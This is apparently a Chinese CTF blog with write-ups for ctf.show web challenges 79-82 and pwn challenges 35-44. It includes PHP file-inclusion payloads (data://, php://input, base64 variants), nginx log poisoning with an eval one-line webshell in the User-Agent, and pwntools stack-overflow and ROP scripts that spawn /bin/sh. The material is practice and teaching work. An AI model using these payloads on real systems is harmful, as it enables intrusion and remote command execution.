<h2 id="Web79"><a href="#Web79" class="headerlink" title="Web79"></a>Web79</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ol>
<li><h4 id="data协议-利用php性质绕过"><a href="#data协议-利用php性质绕过" class="headerlink" title="data协议 利用php性质绕过"></a>data协议 利用php性质绕过</h4></li>
</ol>
<p>过滤掉了php但并不影响使用上一关的方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?=system(&#x27;ls&#x27;);?&gt; 可以获取当前目录文件发现有一个flag.php</span><br><span class="line"></span><br><span class="line">?file=data://text/plain,&lt;?=system(&#x27;tac flag*&#x27;);?&gt; 即可读取flag.php的中的内容。</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><h4 id="input协议-大小写绕过"><a href="#input协议-大小写绕过" class="headerlink" title="input协议 大小写绕过"></a>input协议 大小写绕过</h4></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /?file=Php://input HTTP/1.1</span><br><span class="line"></span><br><span class="line">&lt;?Php system(&quot;ls&quot;);?&gt;</span><br><span class="line"></span><br><span class="line">POST /?file=Php://input HTTP/1.1</span><br><span class="line"></span><br><span class="line">&lt;?Php system(&quot;cat flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250313154431054.png" alt="image-20250313154431054" style="zoom:50%;">

<ol start="3">
<li><h4 id="data协议-base64加密"><a href="#data协议-base64加密" class="headerlink" title="data协议 base64加密"></a>data协议 base64加密</h4></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw==   # &lt;?php system(&#x27;ls&#x27;);</span><br><span class="line"></span><br><span class="line">/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs= # &lt;?php system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure>



<h2 id="Web80"><a href="#Web80" class="headerlink" title="Web80"></a>Web80</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤掉了php和data</p>
<ol>
<li><h4 id="input协议-大小写绕过。同上"><a href="#input协议-大小写绕过。同上" class="headerlink" title="input协议 大小写绕过。同上"></a>input协议 大小写绕过。同上</h4></li>
<li><h4 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h4></li>
</ol>
<p>以下过程使用hackerbar即可搞定</p>
<p>修改User-Agent</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /?file=/var/log/nginx/access.log HTTP/1.1</span><br><span class="line">Host: 4e9bb3c0-1021-427e-81a3-42e5e6e13c39.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0&lt;?php eval($_GET[2]);?&gt;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Cookie: UM_distinctid=17ffcdc88eb73a-022664ffe42c5b8-13676d4a-1fa400-17ffcdc88ec82c</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>可以直接命令执行也可以使用webshell后门工具链接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log&amp;2=system(&#x27;ls /var/www/html&#x27;);phpinfo();</span><br><span class="line"></span><br><span class="line">?file=/var/log/nginx/access.log&amp;2=system(&#x27;tac /var/www/html/fl0g.php&#x27;);phpinfo();</span><br></pre></td></tr></table></figure>



<h2 id="Web81"><a href="#Web81" class="headerlink" title="Web81"></a>Web81</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>比起上到题新过滤了 <code>:</code></p>
<p><u>使用日志注入即可</u></p>
<p>如果绕过没这么复杂的话，直接在user-agent里注入一句话木马即可。</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250313164359707.png" alt="image-20250313164359707" style="zoom:67%;">

<p>记得要发送两次</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;tac fl0g.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p>然后查看源码即可</p>
<h2 id="Web82"><a href="#Web82" class="headerlink" title="Web82"></a>Web82</h2><p>比起上道题多过滤了 <code>.</code> </p>
<h3 id="SESSION条件竞争"><a href="#SESSION条件竞争" class="headerlink" title="SESSION条件竞争"></a>SESSION条件竞争</h3><p>待施工</p>
]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SHOW 刷题记录</title>
    <url>/2025/03/18/%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="CTF-SHOW"><a href="#CTF-SHOW" class="headerlink" title="CTF SHOW"></a>CTF SHOW</h1><blockquote>
<p>pwn35~110</p>
</blockquote>
<h2 id="pwn35（数组溢出）"><a href="#pwn35（数组溢出）" class="headerlink" title="pwn35（数组溢出）"></a>pwn35（数组溢出）</h2><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316194041817.png" alt="image-20250316194041817" style="zoom: 50%;">

<p>数组溢出，输入一个超长字符串即可</p>
<h2 id="pwn36（后门函数直接得到flag）"><a href="#pwn36（后门函数直接得到flag）" class="headerlink" title="pwn36（后门函数直接得到flag）"></a>pwn36（后门函数直接得到flag）</h2><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316203127145.png" alt="image-20250316203127145"></p>
<p>看准了这个ctfshow函数</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316203146247.png" alt="image-20250316203146247" style="zoom: 80%;">

<p>这里使用了gets函数读取s数组，且此程序没有栈溢出保护，故在这里可以进行栈溢出攻击。</p>
<p>同时题目提示有后门函数</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316203321679.png" alt="image-20250316203321679" style="zoom: 67%;">

<p>查看这个get_flag函数</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316203344392.png" alt="image-20250316203344392" style="zoom:80%;">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fgets函数：char* fgets(char *restrict str, int size , FILE* restrict stream)</span><br><span class="line"></span><br><span class="line">char *fgets(“容器的地址”， “容器的大小”， “从哪里读取”）</span><br></pre></td></tr></table></figure>

<p>所以我们需要做的是</p>
<ul>
<li>将ctfshow函数的返回地址填充为get_flag函数的返回地址</li>
</ul>
<p>查看get_flag函数的地址</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316204824640.png" alt="image-20250316204824640" style="zoom:67%;">

<p>为0x08048586</p>
<p>整体思路为：</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316204914827.png" alt="image-20250316204914827" style="zoom:50%;">

<p>（当然还有一截previous ebp），所以距离返回地址的长度为0x28+4</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28183</span>)</span><br><span class="line">flag_addr = <span class="number">0x08048586</span></span><br><span class="line">payload = <span class="number">0x28</span> * <span class="string">b&#x27;a&#x27;</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span> + p32(flag_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="pwn37（32位后门函数获得shell）"><a href="#pwn37（32位后门函数获得shell）" class="headerlink" title="pwn37（32位后门函数获得shell）"></a>pwn37（32位后门函数获得shell）</h2><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316211622179.png" alt="image-20250316211622179"></p>
<p>总的来说和上道题大差不差，init清空缓冲区，logo和puts打印信息。只有ctfshow是挺关键的</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316211716861.png" alt="image-20250316211716861" style="zoom:80%;">

<p>buf数组长14，读入了0x32长的数据，故可以实现栈溢出</p>
<p>题目提示有后门函数，故我们只需要找到后门函数的额起始地址即可</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316212051633.png" alt="image-20250316212051633" style="zoom: 67%;">

<p>故后门函数地址为 0x08048521</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28281</span>)</span><br><span class="line">backdoor_addr = <span class="number">0x08048521</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x12</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span> + p32(backdoor_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="【-】pwn38（64位后门函数获得shell）"><a href="#【-】pwn38（64位后门函数获得shell）" class="headerlink" title="【*】pwn38（64位后门函数获得shell）"></a>【*】pwn38（64位后门函数获得shell）</h2><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316212903030.png" alt="image-20250316212903030" style="zoom:67%;">

<p>题目可以说是完全一样，但是题目说是64位系统。放进checksec里看看就好了</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316213228954.png" alt="image-20250316213228954" style="zoom: 67%;">

<p>注意32位和64位的区别。首先context要设置一下，然后注意寄存器和地址都是八个字节</p>
<p>找到后门函数地址</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316213329394.png" alt="image-20250316213329394" style="zoom:67%;">

<p>0x400657？</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28147</span>)</span><br><span class="line">ret_addr = <span class="number">0x400657</span></span><br><span class="line">payload = <span class="number">10</span> * <span class="string">b&#x27;a&#x27;</span> + <span class="number">8</span> * <span class="string">b&#x27;b&#x27;</span> + p64(ret_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>结果出来是错的，为什么</p>
<p>这是因为64位系统还需要处理**<font color="red">堆栈平衡</font>**</p>
<blockquote>
<p>当我们在堆栈进行堆栈的操作的时候，一定要保证在ret这条指令之前，esp指向的是我们压入栈中的地址，函数执行到ret执行之前，堆栈栈顶的地址一定要是call指令的下一个地址</p>
</blockquote>
<p>因此我们还需要找一个地址： lev 的地址或者该函数结束的地址（即 retn 的地址）</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316215415314.png" alt="image-20250316215415314" style="zoom:50%;">

<p>可以看到</p>
<p>lev的地址：0x40065b</p>
<p>retn的地址：0x+40066d</p>
<p><strong><font color="blue">特别注意：构造 payload 时将该地址放在该函数开始地址之前</font></strong></p>
<h3 id="exp2-0"><a href="#exp2-0" class="headerlink" title="exp2.0"></a>exp2.0</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lev_addr = <span class="number">0x40065b</span></span><br><span class="line">payload = <span class="number">10</span> * <span class="string">b&#x27;a&#x27;</span> + <span class="number">8</span> * <span class="string">b&#x27;b&#x27;</span> + p64(lev_addr) +p64(ret_addr)</span><br></pre></td></tr></table></figure>



<h2 id="pwn39（32位后门函数system与参数分离）"><a href="#pwn39（32位后门函数system与参数分离）" class="headerlink" title="pwn39（32位后门函数system与参数分离）"></a>pwn39（32位后门函数system与参数分离）</h2><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316220015294.png" alt="image-20250316220015294" style="zoom:67%;">

<p>还是我们喜闻乐见的32位ret2text</p>
<p>只不过这里的后门不是函数，而是</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316220118547.png" alt="image-20250316220118547"></p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316220845813.png" alt="image-20250316220845813" style="zoom:50%;">

<p>这里将<code>/bin/sh</code>和<code>system</code>函数分开了</p>
<p>&#x2F;bin&#x2F;sh的地址：0x08048750</p>
<p>system()的地址：0x080483A0</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317091227011.png" alt="image-20250317091227011" style="zoom:50%;">

<p>这张图是便于习惯的，真实的情况如下图</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241117141336080.png" alt="image-20241117141336080" style="zoom: 50%;">

<p>这里从ctfshow函数跳转到了system函数</p>
<p>我们要做的是将返回地址覆盖为system函数，并将参数1填充上&#x2F;bin&#x2F;sh字符串的起始位置。（注意这里的参数不能是&#x2F;bin&#x2F;sh整个字符串，因为字符串本身被硬编码为rodata节中，要传递只能通过地址）</p>
<p>偏移量是：12h + 4	</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250318094735493.png" alt="image-20250318094735493"></p>
<p>这个exit可以是任意地址，如0xdeadbeef(64bit)</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28191</span>)</span><br><span class="line">str_addr = <span class="number">0x08048750</span></span><br><span class="line">sys_addr = <span class="number">0x080483A0</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>* <span class="number">0x12</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span> + p32(sys_addr) + <span class="string">b&#x27;c&#x27;</span> * <span class="number">4</span> + p32(str_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="pwn40（64位后门函数与参数分离（ROP））"><a href="#pwn40（64位后门函数与参数分离（ROP））" class="headerlink" title="pwn40（64位后门函数与参数分离（ROP））"></a>pwn40（64位后门函数与参数分离（ROP））</h2><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317092724016.png" alt="image-20250317092724016" style="zoom:67%;">

<p>发现是64位系统。两者差异如下：</p>
<ul>
<li>x86<ul>
<li>使用栈来传递参数</li>
<li>使用eax存放返回值</li>
</ul>
</li>
<li>x64<ul>
<li>前6个参数依次存放于rdi、rsi、rdx、rcx、r8、r9寄存器中</li>
<li>第7个以后的参数存放于栈中</li>
</ul>
</li>
</ul>
<p>所以我们这里需要控制rdi的值</p>
<p>利用<strong>ROP</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317093554911.png" alt="image-20250317093554911" style="zoom:67%;">

<p>我们使用pop rdi；ret即可，地址为 0x4007e3</p>
<p>ret的地址为：0x4004fe</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317094655085.png" alt="image-20250317094655085" style="zoom:50%;">



<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28150</span>)</span><br><span class="line">offset = <span class="number">0xa</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4007e3</span></span><br><span class="line">ret_addr = <span class="number">0x4004fe</span></span><br><span class="line">sys_addr = <span class="number">0x400520</span></span><br><span class="line">bin_sh_addr = <span class="number">0x400808</span></span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span> + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(ret_addr) + p64(sys_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="pwn41（32位sh替换-bin-sh）"><a href="#pwn41（32位sh替换-bin-sh）" class="headerlink" title="pwn41（32位sh替换&#x2F;bin&#x2F;sh）"></a>pwn41（32位sh替换&#x2F;bin&#x2F;sh）</h2><p>正如题目所说，没有&#x2F;bin&#x2F;sh了，但是又system函数和 ”echo flag“字符串，以及“sh”字符串</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317141526361.png" alt="image-20250317141526361"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317141617461.png" alt="image-20250317141617461" style="zoom:50%;"><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317141627070.png" alt="image-20250317141627070" style="zoom:50%;"></p>
<p>一般情况下，sh和&#x2F;bin&#x2F;sh是等效的</p>
<ol>
<li>system(“&#x2F;bin&#x2F;sh”)：在Linux和类Unix系统中，&#x2F;bin&#x2F;sh通常是一个符号链接，指向<strong>系统默认的shell程序（如Bash或Shell）</strong>。因此，使用system(“&#x2F;bin&#x2F;sh”)会<strong>启动指定的shell程序并在新的子进程中执行</strong>。这种方式可以确保使用系统默认的shell程序执行命令，因为&#x2F;bin&#x2F;sh链接通常指向默认shell的可执行文件</li>
<li>system(“sh”)：使用system(“sh”)会<strong>直接启动一个名为sh的shell程序，并在新的子进程中执行</strong>。这种方式假设系统的<strong>环境变量$PATH已经配置</strong>了能够找到sh可执行文件的路径，否则可能会导致找不到sh而执行失败。</li>
</ol>
<p>所以还是一样的，只是把&#x2F;bin&#x2F;sh字符串换成sh而已</p>
<p>system函数位置：0x080483D0</p>
<p>sh字符串位置：0x080487BA</p>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28297</span>)</span><br><span class="line">system_addr = <span class="number">0x080483D0</span></span><br><span class="line">sh_addr = <span class="number">0x080487BA</span></span><br><span class="line">payload = <span class="number">0x12</span> * <span class="string">b&#x27;a&#x27;</span> + <span class="number">4</span> * <span class="string">b&#x27;b&#x27;</span> + p32(system_addr) + <span class="number">4</span> * <span class="string">b&#x27;c&#x27;</span> + p32(sh_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="pwn42（64位-sh替换-bin-sh（ROP））"><a href="#pwn42（64位-sh替换-bin-sh（ROP））" class="headerlink" title="pwn42（64位&#x2F;sh替换&#x2F;bin&#x2F;sh（ROP））"></a>pwn42（64位&#x2F;sh替换&#x2F;bin&#x2F;sh（ROP））</h2><p>和上道题的漏洞一样，不过是64位系统</p>
<p> 偏移量：0xa</p>
<p>system函数地址：0x400560</p>
<p>sh字符串位置：0x400872</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317143350570.png" alt="image-20250317143350570" style="zoom:67%;">

<p>pop_rdi_ret地址：0x400843</p>
<p>ret地址：0x40053e</p>
<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28269</span>)</span><br><span class="line">system_addr = <span class="number">0x400560</span></span><br><span class="line">sh_addr = <span class="number">0x400872</span></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x400843</span></span><br><span class="line">ret_addr = <span class="number">0x40053e</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xa</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span> + p64(pop_rdi_ret_addr) + p64(sh_addr) + p64(ret_addr) +p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="pwn43（32位不提供后门函数参数）"><a href="#pwn43（32位不提供后门函数参数）" class="headerlink" title="pwn43（32位不提供后门函数参数）"></a>pwn43（32位不提供后门函数参数）</h2><p>32位系统</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317144157630.png" alt="image-20250317144157630" style="zoom:67%;">

<p>gets函数导致栈溢出</p>
<p>查看后门函数</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317144316276.png" alt="image-20250317144316276" style="zoom:67%;">

<p>这次的后门函数似乎有点复杂</p>
<p>首先v0作为种子，值为time(0)</p>
<p>接着v3为v0作为种子的随机数</p>
<p>然后需要输入一个数：v2</p>
<p>如果v2和生成的随机数相同，则进入system函数</p>
<p>破解随机数是下策</p>
<p>我们找到一段可写区域</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317145903183.png" alt="image-20250317145903183" style="zoom:67%;">

<p>实际上这在bss段，其中还有一个buf2数组</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317145919246.png" alt="image-20250317145919246" style="zoom:67%;">

<p>我们可以在这里写入&#x2F;bin&#x2F;sh</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317192647582.png" alt="image-20250317192647582" style="zoom:67%;">

<h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28292</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x6c</span> + <span class="number">4</span></span><br><span class="line">sys_addr = <span class="number">0x08048450</span></span><br><span class="line">gets_addr = <span class="number">0x08048420</span></span><br><span class="line">bin_sh_addr = <span class="number">0x0804B060</span></span><br><span class="line"></span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(gets_addr) + p32(sys_addr) + p32(bin_sh_addr) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="pwn44（64位不提供后门函数参数）"><a href="#pwn44（64位不提供后门函数参数）" class="headerlink" title="pwn44（64位不提供后门函数参数）"></a>pwn44（64位不提供后门函数参数）</h2><p>漏洞原理和上道题一样，只不过换成了64位系统</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317193741187.png" alt="image-20250317193741187"></p>
<p>找到一块可读写区域，位于bss段</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317193801701.png" alt="image-20250317193801701"></p>
<p>将字符串的起始位置定位：0x602048</p>
<p>system函数：0x400520</p>
<p>gets函数：0x400530</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317194030271.png" alt="image-20250317194030271" style="zoom:50%;">

<p>pop_rdi_ret：0x4007f3</p>
<p>ret：0x4004fe</p>
<h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28289</span>)</span><br><span class="line">bin_sh_addr = <span class="number">0x602048</span></span><br><span class="line">sys_addr = <span class="number">0x400520</span></span><br><span class="line">gets_addr = <span class="number">0x400530</span></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x4007f3</span></span><br><span class="line">ret_addr = <span class="number">0x4004fe</span></span><br><span class="line">offset = <span class="number">0xa</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(ret_addr) + p64(gets_addr) + p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(ret_addr) +p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><code>p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(ret_addr)</code>这一块在传递参数</p>
